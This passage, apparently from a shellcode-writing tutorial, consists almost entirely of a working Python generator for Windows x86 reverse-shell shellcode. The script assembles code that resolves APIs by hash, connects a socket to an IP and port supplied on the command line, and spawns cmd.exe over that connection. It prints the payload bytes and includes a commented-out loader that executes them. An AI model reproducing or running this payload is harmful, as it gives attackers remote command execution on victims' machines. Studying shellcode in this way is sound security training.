        "       push eax                        ;",  # Push lpProcessInformation
        "       push edi                        ;",  # Push lpStartupInfo
        "       xor eax, eax                    ;",  # Null EAX
        "       push eax                        ;",  # Push lpCurrentDirectory
        "       push eax                        ;",  # Push lpEnvironment
        "       push eax                        ;",  # Push dwCreationFlags
        "       inc eax                         ;",  # Increase EAX, EAX = 0x01 (TRUE)
        "       push eax                        ;",  # Push bInheritHandles
        "       dec eax                         ;",  # Null EAX
        "       push eax                        ;",  # Push lpThreadAttributes
        "       push eax                        ;",  # Push lpProcessAttributes
        "       push ebx                        ;",  # Push lpCommandLine
        "       push eax                        ;",  # Push lpApplicationName
        "       call dword ptr [ebp+0x18]       ;",  # Call CreateProcessA
        "   exec_shellcode:                      ",
        "       xor ecx, ecx                    ;",  # Null ECX
        "       push ecx                        ;",  # uExitCode
        "       push 0xffffffff                 ;",  # hProcess
        "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
```

The final code is the following: (as we don't need to test shellcode, we can remove the tests)

```py
import ctypes, struct, numpy, sys
from keystone import *

def ror_str(byte, count):
    binb = numpy.base_repr(byte, 2).zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return (int(binb, 2))

def push_function_hash(function_name):
    edx = 0x00
    count = 0
    
    for eax in function_name:
        edx = edx + ord(eax)
        if count < len(function_name)-1:
            edx = ror_str(edx, 0xd)
        count += 1
    
    return ("push " + hex(edx))

def hex_ip(ip_address):
    ip_addr_hex = []
    for block in ip_address.split("."):
        ip_addr_hex.append(format(int(block), "02x"))
    ip_addr_hex.reverse()
    return "0x" + "".join(ip_addr_hex)


def hex_port(port):
    port_hex = format(int(port), "04x")
    return "0x" + str(port_hex[2:4]) + str(port_hex[0:2])

def reverse_shell(ip_address, port):
    push_terminateprocess_hash = push_function_hash("TerminateProcess")
    push_loadlibrarya_hash = push_function_hash("LoadLibraryA")
    push_createprocessa_hash = push_function_hash("CreateProcessA")
    push_wsastartup_hash = push_function_hash("WSAStartup")
    push_wsasocketa_hash = push_function_hash("WSASocketA")
    push_wsaconnect_hash = push_function_hash("WSAConnect")

    CODE = [
            "start:                                  ",
            "   mov ebp, esp                        ;",
            "   add esp, 0xfffffdf0                 ;",  #   Avoid NULL bytes

            "find_kernel32:                          ",
            "   xor ecx, ecx                        ;",  #   ECX = 0
            "   mov esi, fs:[ecx+0x30]              ;",  #   ESI = &(PEB)
            "   mov esi, [esi+0x0C]                 ;",  #   ESI = PEB->Ldr
            "   mov esi, [esi+0x1C]                 ;",  #   ESI = PEB->Ldr.InInitOrder

            "next_module:                            ",
            "   mov ebx, [esi+0x8]                  ;",  #   EBX = InInitOrder[x].base_address
            "   mov edi, [esi+0x20]                 ;",  #   EDI = InInitOrder[x].module_name
            "   mov esi, [esi]                      ;",  #   ESI = InInitOrder[x].flink
            "   cmp [edi+12*2], cx                  ;",  #   module_name[12] == 0x00 ?
            "   jne next_module                     ;",  #   jump to the next module

            "find_function_shorten:                  ",
            "   jmp find_function_shorten_bnc       ;",  #   Short jump

            "find_function_ret:                      ",
            "   pop esi                             ;",  #   POP the return address from the stack
            "   mov [ebp+0x04], esi                 ;",  #   Save find_function address for later usage
            "   jmp resolve_symbols_kernel32        ;",

            "find_function_shorten_bnc:              ",
            "   call find_function_ret              ;",  #   Relative CALL with negative offset

            "find_function:                          ",
            "   pushad                              ;",  #   Save all registers
            "   mov eax, [ebx+0x3c]                 ;",  #   Offset to PE Signature
            "   mov edi, [ebx+eax+0x78]             ;",  #   Export Table Directory RVA
            "   add edi, ebx                        ;",  #   Export Table Directory VMA
            "   mov ecx, [edi+0x18]                 ;",  #   NumberOfNames
            "   mov eax, [edi+0x20]                 ;",  #   AddressOfNames RVA
            "   add eax, ebx                        ;",  #   AddressOfNames VMA
            "   mov [ebp-4], eax                    ;",  #   Save AddressOfNames VMA

            "find_function_loop:                     ",
            "   jecxz find_function_finished        ;",  #   jump if ECX == 0
            "   dec ecx                             ;",  #   Decrement names counter
            "   mov eax, [ebp-4]                    ;",  #   Restore AddressOfNames VMA
            "   mov esi, [eax+ecx*4]                ;",  #   RVA of the symbol name
            "   add esi, ebx                        ;",  #   ESI = (VMA of the current symbol name)       

            "compute_hash:                           ", 
            "   xor eax, eax                        ;",  #   EAX = 0
            "   cdq                                 ;",  #   EDX = 0
            "   cld                                 ;",  #   Clear direction flag (DF)

            "compute_hash_again:                     ",
            "   lodsb                               ;",  #   Load the next byte from esi into al
            "   test al, al                         ;",  #   Check for NULL terminator
            "   jz compute_hash_finished            ;",  #   If the ZF is set, we've hit the NULL terminator
            "   ror edx, 0x0d                       ;",  #   Rotate edx 13 bits to the right
            "   add edx, eax                        ;",  #   Add the new byte to the accumulator
            "   jmp compute_hash_again              ;",  #   Next iteration

            "compute_hash_finished:                  ", 
            
            "find_function_compare:                  ",
            "   cmp edx, [esp+0x24]                 ;",  #   Compare hashes
            "   jnz find_function_loop              ;",  #   jump if it does not match
            "   mov edx, [edi+0x24]                 ;",  #   AddressOfNameOrdinals RVA
            "   add edx, ebx                        ;",  #   AddressOfNameOrdinals VMA
            "   mov cx, [edx+2*ecx]                 ;",  #   Extrapolate the function's ordinal
            "   mov edx, [edi+0x1c]                 ;",  #   AddressOfFunctions RVA
            "   add edx, ebx                        ;",  #   AddressOfFunctions VMA
            "   mov eax, [edx+4*ecx]                ;",  #   Get the function RVA
            "   add eax, ebx                        ;",  #   Get the function VMA
            "   mov [esp+0x1c], eax                 ;",
            
            "find_function_finished:                 ",
            "   popad                               ;",  #   Restore registers
            "   ret                                 ;",

            "resolve_symbols_kernel32:               ",
            push_terminateprocess_hash,                  #   TerminateProcess hash
            "   call dword ptr [ebp+0x04]           ;",  #   Call find_function
            "   mov [ebp+0x10], eax                 ;",  #   Save TerminateProcess address for later
            push_loadlibrarya_hash,                      # LoadLibraryA hash
            "       call dword ptr [ebp+0x04]       ;",  # Call find_function
            "       mov [ebp+0x14], eax             ;",  # Save LoadLibraryA address for later
            push_createprocessa_hash,                    # CreateProcessA hash
            "       call dword ptr [ebp+0x04]       ;",  # Call find_function
            "       mov [ebp+0x18], eax             ;",  # Save CreateProcessA address for later
            "   load_ws2_32:                         ",
            "       xor eax, eax                    ;",  # Null EAX
            "       mov ax, 0x6c6c                  ;",  # Move the end of the string in AX
            "       push eax                        ;",  # Push EAX on the stack with string NULL terminator
            "       push 0x642e3233                 ;",  # Push part of the string on the stack
            "       push 0x5f327377                 ;",  # Push another part of the string on the stack
            "       push esp                        ;",  # Push ESP to have a pointer to the string
            "       call dword ptr [ebp+0x14]       ;",  # Call LoadLibraryA
            "   resolve_symbols_ws2_32:              ",
            "       mov ebx, eax                    ;",  # Move the base address of ws2_32.dll to EBX
            push_wsastartup_hash,                        # WSAStartup hash
            "       call dword ptr [ebp+0x04]       ;",  # Call find_function
            "       mov [ebp+0x1C], eax             ;",  # Save WSAStartup address for later usage
            push_wsasocketa_hash,                        # WSASocketA hash
            "       call dword ptr [ebp+0x04]       ;",  # Call find_function
            "       mov [ebp+0x20], eax             ;",  # Save WSASocketA address for later usage
            push_wsaconnect_hash,                        # WSAConnect hash
            "       call dword ptr [ebp+0x04]       ;",  # Call find_function
            "       mov [ebp+0x24], eax             ;",  # Save WSAConnect address for later usage
            "   call_wsastartup:                    ;",
            "       mov eax, esp                    ;",  # Move ESP to EAX
            "       xor ecx, ecx                    ;",
            "       mov cx, 0x590                   ;",  # Move 0x590 to CX
            "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
            "       push eax                        ;",  # Push lpWSAData
            "       xor eax, eax                    ;",  # Null EAX
            "       mov ax, 0x0202                  ;",  # Move version to AX
            "       push eax                        ;",  # Push wVersionRequired
            "       call dword ptr [ebp+0x1C]       ;",  # Call WSAStartup
            "   call_wsasocketa:                     ",
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push dwFlags
            "       push eax                        ;",  # Push g
            "       push eax                        ;",  # Push lpProtocolInfo
            "       mov al, 0x06                    ;",  # Move AL, IPPROTO_TCP
            "       push eax                        ;",  # Push protocol
            "       sub al, 0x05                    ;",  # Substract 0x05 from AL, AL = 0x01
            "       push eax                        ;",  # Push type
            "       inc eax                         ;",  # Increase EAX, EAX = 0x02
            "       push eax                        ;",  # Push af
            "       call dword ptr [ebp+0x20]       ;",  # Call WSASocketA
            "   call_wsaconnect:                     ",
            "       mov esi, eax                    ;",  # Move the SOCKET descriptor to ESI
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push sin_zero[]
            "       push eax                        ;",  # Push sin_zero[]
            f"      push {hex_ip(ip_address)}       ;",  # Push address 
            f"      mov ax, {hex_port(port)}        ;",  # Move the port
            "       shl eax, 0x10                   ;",  # Left shift EAX by 0x10 bytes
            "       add ax, 0x02                    ;",  # Add 0x02 (AF_INET) to AX
            "       push eax                        ;",  # Push sin_port & sin_family
            "       push esp                        ;",  # Push pointer to the sockaddr_in structure
            "       pop edi                         ;",  # Store pointer to sockaddr_in in EDI
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push lpGQOS
            "       push eax                        ;",  # Push lpSQOS
            "       push eax                        ;",  # Push lpCalleeData
            "       push eax                        ;",  # Push lpCalleeData
            "       add al, 0x10                    ;",  # Set AL to 0x10
            "       push eax                        ;",  # Push namelen
            "       push edi                        ;",  # Push *name
            "       push esi                        ;",  # Push s
            "       call dword ptr [ebp+0x24]       ;",  # Call WSAConnect
            "   create_startupinfoa:                 ",
            "       push esi                        ;",  # Push hStdError
            "       push esi                        ;",  # Push hStdOutput
            "       push esi                        ;",  # Push hStdInput
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push lpReserved2
            "       push eax                        ;",  # Push cbReserved2 & wShowWindow
            "       mov al, 0x80                    ;",  # Move 0x80 to AL
            "       xor ecx, ecx                    ;",  # Null ECX
            "       mov cl, 0x80                    ;",  # Move 0x80 to CX
            "       add eax, ecx                    ;",  # Set EAX to 0x100
            "       push eax                        ;",  # Push dwFlags
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push dwFillAttribute
            "       push eax                        ;",  # Push dwYCountChars
            "       push eax                        ;",  # Push dwXCountChars
            "       push eax                        ;",  # Push dwYSize
            "       push eax                        ;",  # Push dwXSize
            "       push eax                        ;",  # Push dwY
            "       push eax                        ;",  # Push dwX
            "       push eax                        ;",  # Push lpTitle
            "       push eax                        ;",  # Push lpDesktop
            "       push eax                        ;",  # Push lpReserved
            "       mov al, 0x44                    ;",  # Move 0x44 to AL
            "       push eax                        ;",  # Push cb
            "       push esp                        ;",  # Push pointer to the STARTUPINFOA structure
            "       pop edi                         ;",  # Store pointer to STARTUPINFOA in EDI
            "   create_cmd_string:                   ",
            "       mov eax, 0xff9a879b             ;",  # Move 0xff9a879b into EAX
            "       neg eax                         ;",  # Negate EAX, EAX = 00657865
            "       push eax                        ;",  # Push part of the "cmd.exe" string
            "       push 0x2e646d63                 ;",  # Push the remainder of the "cmd.exe"
            "       push esp                        ;",  # Push pointer to the "cmd.exe" string
            "       pop ebx                         ;",  # Store pointer to the "cmd.exe" string
            "   call_createprocessa:                 ",
            "       mov eax, esp                    ;",  # Move ESP to EAX
            "       xor ecx, ecx                    ;",  # Null ECX
            "       mov cx, 0x390                   ;",  # Move 0x390 to CX
            "       sub eax, ecx                    ;",  # Substract CX from EAX to avoid overwriting the structure later
            "       push eax                        ;",  # Push lpProcessInformation
            "       push edi                        ;",  # Push lpStartupInfo
            "       xor eax, eax                    ;",  # Null EAX
            "       push eax                        ;",  # Push lpCurrentDirectory
            "       push eax                        ;",  # Push lpEnvironment
            "       push eax                        ;",  # Push dwCreationFlags
            "       inc eax                         ;",  # Increase EAX, EAX = 0x01 (TRUE)
            "       push eax                        ;",  # Push bInheritHandles
            "       dec eax                         ;",  # Null EAX
            "       push eax                        ;",  # Push lpThreadAttributes
            "       push eax                        ;",  # Push lpProcessAttributes
            "       push ebx                        ;",  # Push lpCommandLine
            "       push eax                        ;",  # Push lpApplicationName
            "       call dword ptr [ebp+0x18]       ;",  # Call CreateProcessA
            "   exec_shellcode:                      ",
            "       xor ecx, ecx                    ;",  # Null ECX
            "       push ecx                        ;",  # uExitCode
            "       push 0xffffffff                 ;",  # hProcess
            "       call dword ptr [ebp+0x10]       ;",  # Call TerminateProcess
    ]

    return "\n".join(CODE)

def main():
    help_message = "\n[i] Usage: python3 custom_shellcode.py [IP] [Port]"
    
    if (len(sys.argv) != 3):
        print(help_message)
    
    # Initialize engine in X86-32bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)

    encoding, count = ks.asm(reverse_shell(sys.argv[1], sys.argv[2]))
    print("Encoded %d instructions..." % count)

    shellcode = ""

    shellcode += 'shellcode = b"'

    for enc in encoding:
        shellcode += "\\x{0:02x}".format(enc)

    shellcode += '"'

    print(shellcode)

    # CODE USED FOR TESTING, COMMENT OUT TO TEST YOUR SHELLCODE
    
    # ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
    #                                         ctypes.c_int(len(shellcode)),
    #                                         ctypes.c_int(0x3000),
    #                                         ctypes.c_int(0x40))

    # buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    # ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
    #                                     buf,
    #                                     ctypes.c_int(len(shellcode)))

    # print("Shellcode located at address %s" % hex(ptr))
    # input("...ENTER TO EXECUTE SHELLCODE...")

    # ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
    #                                         ctypes.c_int(0),
    #                                         ctypes.c_int(ptr),
    #                                         ctypes.c_int(0),
    #                                         ctypes.c_int(0),
    #                                         ctypes.pointer(ctypes.c_int(0)))

    # ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

main()
```
